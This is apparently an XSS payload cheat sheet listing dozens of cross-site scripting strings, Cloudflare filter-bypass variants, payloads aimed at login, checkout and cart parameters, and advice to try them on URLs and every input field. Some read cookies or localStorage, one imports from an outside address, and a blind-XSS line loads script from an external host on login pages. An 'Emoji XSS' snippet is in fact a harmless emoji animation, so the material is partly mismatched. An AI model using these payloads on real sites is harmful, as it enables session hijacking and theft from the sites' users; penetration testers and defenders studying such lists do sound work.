```html

s"'><img src=x onerror=alert(document.domain)>

'"><img src=x onerror=prompt()>RANDOMTEXTFROMRAT'" onload=prompt()><img/src=x><img%20src=x><img%2520src=x>

<script> throw[onerror]=[alert],1 </script>
<script> [onerror]=[alert];throw 1 </script> 
<script> const{onerror}=alert;throw 1 </script>


"><img src onerror=alert(1)>
"><img src=x onerror=alert(1)>
"><img src=x onerror=prompt(1)>
"><img src=x onerror=console.log('XSS')>
"autofocus onfocus=alert(1)// 
</script><script>alert(1)</script> 
'-alert(1)-' 
\\'-alert(1)// 
javascript:alert(1)
"><img src=x onerror=prompt(1);>
<--\`<img/src=\` onerror=alert(1)> --!>
<body/onload=&lt;!--&gt;&#10alert(1)>
<body/onload=&lt;!--&gt;&#10alert(1)>
{{$on.constructor('alert(document.domain)')()}}

```
For Login,checkout,cart params:
```
' ''--></style></scRipt><scRipt>alert(1)</scRipt>
```
Emoji XSS:
```js
const faces = [...'![😬](https://abs-0.twimg.com/emoji/v2/svg/1f62c.svg)![😐](https://abs-0.twimg.com/emoji/v2/svg/1f610.svg)![🙁](https://abs-0.twimg.com/emoji/v2/svg/1f641.svg)![😣](https://abs-0.twimg.com/emoji/v2/svg/1f623.svg)![😦](https://abs-0.twimg.com/emoji/v2/svg/1f626.svg)![😲](https://abs-0.twimg.com/emoji/v2/svg/1f632.svg)![😬](https://abs-0.twimg.com/emoji/v2/svg/1f62c.svg)![😐](https://abs-0.twimg.com/emoji/v2/svg/1f610.svg)![🙂](https://abs-0.twimg.com/emoji/v2/svg/1f642.svg)![😀](https://abs-0.twimg.com/emoji/v2/svg/1f600.svg)']; let index = 0; setInterval(_ => { index = (index + 1) % 10; container.innerText = faces[index]; }, 100);
```

Cloudfare bypass:
```html
< svg on onload = ( alert ) ( document.domain ) > 

r " on onmouseover = ( alert ) ( document.domain ) // 

r \* / eval ?. ( value % 2B / ( / . source ) // " > < input value = confirm autofocus onfocus = ' / \* "

<svgononload=( alert )( document.domain )> <a"/onclick=(confirm)(document.cookie)>Click Here! Hex: <svg onload=prompt%26%23x000000028;document.domain)> r"ononmouseover=( alert )( document.domain )// <svg%0Aonauxclick=0;[1].some(confirm)// 

<svgonx=()onload=(confirm)(JSON.stringify(localStorage))> <svg/OnLoad="`${prompt``}`"> <svgonload=alert%26%230000000040"1")> <iframe/src=javascript:%2520with(document)with(body)innerHTML="<svg/onload"%2B"=alert\x28\x29\x3e">

/<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;> /<svg%0Aonauxclick=0;[1].some(confirm)// %27;%0d%0d});%0d{onerror=prompt}throw document.location</ScRipT// {{x={'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

<--`<img/src=` onerror=confirm``> --!> 
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a> 
<--`<img/src=` onerror=confirm``> --!> 
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>

<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
javascript:{ alert`0` } 
1'"><img/src/onerror=.1|alert``> 
<img src=x onError=import('//1152848220/')>
%2sscript%2ualert()%2s/script%2u 
<svg on onload=(alert)(document.domain)>


```
Try on:
- URL query, Fragment & path;
- all input fields.

**Try on Login page:**
`"><script src=//me.xss.ht></script>`

https://hakin9.org/bxss-a-blind-xss-injector-tool/